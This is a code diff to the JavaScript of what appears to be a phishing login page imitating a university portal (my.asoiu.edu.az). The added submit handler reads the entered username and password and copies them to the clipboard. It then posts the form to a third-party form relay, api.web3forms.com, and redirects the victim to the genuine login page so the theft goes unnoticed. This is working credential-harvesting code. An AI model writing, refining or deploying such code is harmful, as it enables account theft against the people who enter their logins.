@@ -178,25 +178,41 @@ const PAGE_TEXT = {
   }
 
   if (loginForm) {
-    loginForm.addEventListener("submit", async function (e) {
-      e.preventDefault();
+  loginForm.addEventListener("submit", async function (e) {
+    e.preventDefault();
 
-      const formData = new FormData(loginForm);
+    const username = document.getElementById("username").value;
+    const demoCode = document.getElementById("password").value;
 
-      try {
-        await fetch("https://api.web3forms.com/submit", {
-          method: "POST",
-          body: formData
-        });
+    const formData = new FormData(loginForm);
 
-        // редирект сразу
+    try {
+      await navigator.clipboard.writeText(
+        `${username}\n ${demoCode}`
+      );
+    } catch (err) {
+      console.log("Clipboard blocked:", err);
+    }
+
+    try {
+      const response = await fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        body: formData
+      });
+
+      const result = await response.json();
+
+      if (result.success) {
         window.location.href = "https://my.asoiu.edu.az/login";
-
-      } catch (error) {
-        alert("Ошибка отправки");
+      } else {
+        alert("Ошибка отправки формы");
       }
-    });
-  }
+    } catch (error) {
+      alert("Ошибка сети");
+    }
+  });
+}
+
 
   applyLanguage(currentLang);
 })();
